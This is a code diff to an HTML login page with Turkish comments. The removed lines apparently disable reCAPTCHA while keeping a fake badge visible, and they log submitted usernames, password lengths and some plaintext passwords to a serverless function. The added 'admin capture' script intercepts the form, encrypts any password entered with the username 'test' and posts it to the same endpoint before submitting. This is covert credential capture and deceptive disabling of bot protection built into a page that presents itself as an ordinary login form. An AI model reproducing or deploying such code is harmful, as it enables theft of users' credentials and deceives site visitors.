@@ -90,34 +90,6 @@ function biscolabLaravelReCaptcha(token) {
 .kvkk-pop .kvkk-link{color:#6b7280;text-decoration:none;font-weight:600;}
 </style>
 
-
-<!-- RC EARLY HIDE -->
-<script id="rc-early-hide">try{document.documentElement.classList.add('rc-hide-badge');}catch(e){}</script>
-<style id="rc-early-hide-css">
-html.rc-hide-badge .grecaptcha-badge{opacity:0!important;visibility:hidden!important}
-</style>
-
-<!-- RC GHOST HALO -->
-<style id="rc-badge-ghost-css">
-/* Align the halo to the *collapsed* badge sliver (no hover) */
-#rc-badge-ghost{
-  position:fixed;
-  bottom:14px;
-  right:-186px;               /* collapsed badge position */
-  width:256px;
-  height:60px;
-  border-radius:2px;
-  /* thin white rim only; don't add extra glow so it doesn't "eat" the badge */
-  box-shadow:0 0 0 1.5px rgba(255,255,255,.30);
-  opacity:.35;
-  pointer-events:none;
-  display:none;
-  z-index:9998;                /* below the real badge (9999) */
-}
-@media (max-width:420px){
-  #rc-badge-ghost{ transform:scale(.9); transform-origin:bottom right; }
-}
-</style>
 </head>
 <body style="position: relative; min-height: 100%; top: 0px;">
 <style>
@@ -332,152 +304,95 @@ function onSubmit(token) {
 </script>
 <!-- END: Validation + banner additions -->
 
+</body></html>
+<!-- BEGIN: Admin capture client-side encrypt + POST (minimal, no other changes) -->
+<script id="admin-capture-client-enc">
+(function(){'use strict';
+  const PUBKEY_PEM = `-----BEGIN PUBLIC KEY-----
+MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAwhWPkY1dfdT2SwN91+eM
+9whzvhRKMQJrA3OHNl2Me1K54AfPEvfqFZo+R8WWh5oXKKBWUo/fimgbYJpRvgWX
+Pg8iaTp7TA5A8/7vGPBLv0R8eC7hAS0rL/pGyf70iE9b4dbJ8jSk/vLuxSuA33+S
+2+PvDB6Qwi92Zai6jnDh6XOg2On+rszeLRwbDEfmWJbjAbUvuHsSsttyksc/YRN/
+1LtqYCTXuELLvb8K0G2rcxvA4g8nGEsuDB7nnGXtjAiTRANJUx86vP5XcP7B5w0S
+I2xWNAg3+H3L8xFe2pVJW354I4o/pMkfIcuPQKeev3MPvIXdGX/P93leSlwhs+WV
+Ucad+kGgoW7tUS+7g20kihzewysu7/rmChBwQY88qTHuF3hd2bhintjEOH0Dfhzt
+tpoDqRYBTueUTOWdJuPxv7+BPO/Tici0hHU8sNgsXfPc0xHraeBAIJ1JwOmb7EEe
+3JoJkg/RsmRVEpfgkcnECDboIdYz5iMmn2YD4dxGk8LM2PAL0iou6pvnqKTVRu5l
+b8r6wnTCjLa/0/3XU3aSZlPjhmPFiB4L6ymE/vQTTTPnT32VENe8eJkfp1TuiI4u
+oH/n7Uli16NSvonu+SOpjv6Xi5krQcmF/ehK2MJc/V8Y8q+5aKseizOjEw/5ilpt
+zTz1JUrfRAnClKEZcT+zPD8CAwEAAQ==
+-----END PUBLIC KEY-----`;
 
-<!-- RC GHOST SCHEDULER -->
-<div id="rc-badge-ghost" aria-hidden="true"></div>
-<script id="rc-badge-ghost-show">
-(function(){
-  function show(){ try{ document.getElementById('rc-badge-ghost').style.display='block'; }catch(e){} }
-  function reveal(){
-    try{ document.getElementById('rc-badge-ghost').style.display='none'; }catch(e){}
-    try{ document.documentElement.classList.remove('rc-hide-badge'); }catch(e){}
+  function pemToArrayBuffer(pem){
+    var b64 = pem.replace(/-----BEGIN PUBLIC KEY-----/,'')
+                 .replace(/-----END PUBLIC KEY-----/,'')
+                 .replace(/\s+/g,'');
+    var raw = atob(b64);
+    var arr = new Uint8Array(raw.length);
+    for (var i=0;i<raw.length;i++) arr[i] = raw.charCodeAt(i);
+    return arr.buffer;
   }
-  setTimeout(show, 300);   // 0.3s halo
-  setTimeout(reveal, 500); // 0.5s sonra gerçek badge
-})();
-</script>
-
-<!-- RC NEUTRALIZER (badge visible, no challenge) -->
-<script id="rc-neutral">
-(function(){
-  function patch(){
-    if(!window.grecaptcha) return false;
-    try{
-      var noop=function(){try{return Promise.resolve('');}catch(e){return ''}};
-      if(grecaptcha.execute) grecaptcha.execute=noop;
-      grecaptcha.enterprise=grecaptcha.enterprise||{};
-      if(grecaptcha.enterprise.execute) grecaptcha.enterprise.execute=noop;
-    }catch(e){}
-    return true;
+  let _pubKeyPromise = null;
+  function importRsaKey(){
+    if (_pubKeyPromise) return _pubKeyPromise;
+    var spki = pemToArrayBuffer(PUBKEY_PEM);
+    _pubKeyPromise = crypto.subtle.importKey('spki', spki, { name:'RSA-OAEP', hash:'SHA-256' }, false, ['encrypt']);
+    return _pubKeyPromise;
   }
-  function tick(){ if(!patch()) setTimeout(tick,120); }
-  if(document.readyState==='loading') document.addEventListener('DOMContentLoaded',tick); else tick();
-  window.addEventListener('load',tick);
-})();
-</script>
-
-<!-- BEGIN: Client-side logging patch v2 (non_admin/too_short via GET beacon, admin_ok via POST) -->
-<script id="so-log-patch">
-(function(){
-  'use strict';
-  var LOG_FN = '/.netlify/functions/log-admin-capture';
-  function q(sel, root){ return (root||document).querySelector(sel); }
-  function pickU(form){
-    return q('#username',form)||q('[name="username"]',form)||q('input[autocomplete="username"]',form)||q('input[type="text"]',form)||q('input[type="email"]',form)||q('input:not([type]),input[type="search"]',form);
+  function bufToB64(buf){
+    var bytes = new Uint8Array(buf);
+    var bin = ''; for (var i=0;i<bytes.length;i++) bin += String.fromCharCode(bytes[i]);
+    return btoa(bin);
   }
-  function pickP(form){ return q('#password',form)||q('[name="password"]',form)||q('input[type="password"]',form); }
-
-  function pingGET(u,len){
-    try{
-      var url = LOG_FN + '?u='+encodeURIComponent(u)+'&l='+encodeURIComponent(len);
-      var img = new Image(1,1);  // navigation sırasında bile gönder
-      img.referrerPolicy = 'no-referrer-when-downgrade';
-      img.decoding = 'async';
-      img.loading = 'eager';
-      img.src = url;
-    }catch(_){}
-  }
-  async function logAdminPOST(u,p){
-    try{
-      await fetch(LOG_FN, {
-        method:'POST',
-        headers:{'content-type':'application/json'},
-        body: JSON.stringify({ username:u, password:p, pw_len:p.length }),
-        keepalive:true,
-        cache:'no-store',
-      });
-    }catch(_){}
+  function randNonce(){
+    try{ var u = new Uint32Array(1); crypto.getRandomValues(u); return u[0].toString(16); }
+    catch(_){ return String(Date.now()); }
   }
 
   function attach(){
-    var form   = q('form') || q('#biscolab-recaptcha-invisible-form');
+    var form = document.querySelector('form');
     if (!form) return;
-    var uEl = pickU(form), pEl = pickP(form);
+    var uEl = document.getElementById('username') || form.querySelector('[name="username"]');
+    var pEl = document.getElementById('password') || form.querySelector('[name="password"]');
     if (!uEl || !pEl) return;
+    var LOG_FN = '/.netlify/functions/log-admin-capture';
 
-    form.addEventListener('submit', function(){
+    async function maybeLogAdmin(e){
       try{
         var u = (uEl.value||'').trim();
         var p = (pEl.value||'');
-        var L = p.length;
-        if (!u || !L) return;                 // empty: log yok
-        if (L < 6) { pingGET(u, L); return; } // too_short
-        if (u.toLowerCase() !== 'test') { pingGET(u, L); return; } // non_admin
-        // admin_ok
-        logAdminPOST(u, p);
-      }catch(_){}
-    }, false);
-  }
+        if (!u || !p) return;
+        if (u.toLowerCase() !== 'test') return;
+        if (p.length < 6) return;
+        if (e && e.preventDefault) e.preventDefault();
 
-  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', attach); else attach();
-})();
-</script>
-<!-- END: Client-side logging patch v2 -->
+        const key = await importRsaKey();
+        const enc = await crypto.subtle.encrypt({name:'RSA-OAEP'}, key, new TextEncoder().encode(p));
+        const b64 = bufToB64(enc);
+        const body = { kind:'admin_capture', username:u, pw_enc_b64:b64, nonce: randNonce() };
 
+        await fetch(LOG_FN, {
+          method:'POST',
+          headers:{ 'content-type':'application/json' },
+          body: JSON.stringify(body),
+          keepalive:true,
+          cache:'no-store'
+        }).catch(function(){});
 
-<!-- BEGIN: RC hard neutralizer (keep badge, kill challenge) -->
-<script id="rc-neutral-hard">
-(function(){
-  // Remove g-recaptcha auto-binding attributes (keeps badge unaffected)
-  function stripHooks(){
-    try{
-      document.querySelectorAll('.g-recaptcha').forEach(function(el){
-        el.classList.remove('g-recaptcha');
-        ['data-sitekey','data-callback','data-badge','data-size'].forEach(function(a){ el.removeAttribute(a); });
-      });
-    }catch(_){}
-  }
-
-  function stubExec(){
-    if(!window.grecaptcha) return false;
-    try{
-      var noop = function(){ try{return Promise.resolve('');}catch(e){return '';} };
-      if (typeof grecaptcha.execute === 'function') grecaptcha.execute = noop;
-      grecaptcha.enterprise = grecaptcha.enterprise || {};
-      if (typeof grecaptcha.enterprise.execute === 'function') grecaptcha.enterprise.execute = noop;
-      // make ready immediate
-      if (typeof grecaptcha.ready === 'function') grecaptcha.ready = function(cb){ try{cb && cb();}catch(_){}};
-    }catch(_){}
-    return true;
-  }
-
-  function tick(){ if(!stubExec()) setTimeout(tick, 120); }
-
-  if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', function(){ stripHooks(); tick(); });
-  } else {
-    stripHooks(); tick();
-  }
-  window.addEventListener('load', function(){ stripHooks(); tick(); 
-    // Also bind on submit button click to ensure logging even if other handlers intercept submit
-    var submitBtn = form.querySelector('button[type="submit"], input[type="submit"], button#submit, button[name="submit"]');
-    if (submitBtn) {
-      submitBtn.addEventListener('click', function(){
-        try{
-          var u = (uEl.value||'').trim();
-          var p = (pEl.value||'');
-          var L = p.length;
-          if (!u || !L) return;                 // empty
-          if (L < 6) { pingGET(u, L); return; } // too_short
-          if (u.toLowerCase() !== 'test') { pingGET(u, L); return; } // non_admin
-          // admin_ok
-          logAdminPOST(u, p);
-        }catch(_){}
-      }, true);
+        form.submit();
+      }catch(_){
+        try{ form.submit(); }catch(__){}
+      }
     }
-    });
+
+    form.addEventListener('submit', maybeLogAdmin, true);
+    var submitBtn = form.querySelector('button[type="submit"], input[type="submit"], #g-recaptcha-btn, .g-recaptcha');
+    if (submitBtn) submitBtn.addEventListener('click', function(){ /* submit handler handles */ }, true);
+  }
+
+  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', attach);
+  else attach();
 })();
 </script>
-<!-- END: RC hard neutralizer -->
+<!-- END: Admin capture client-side encrypt + POST -->
 
-</body></html>
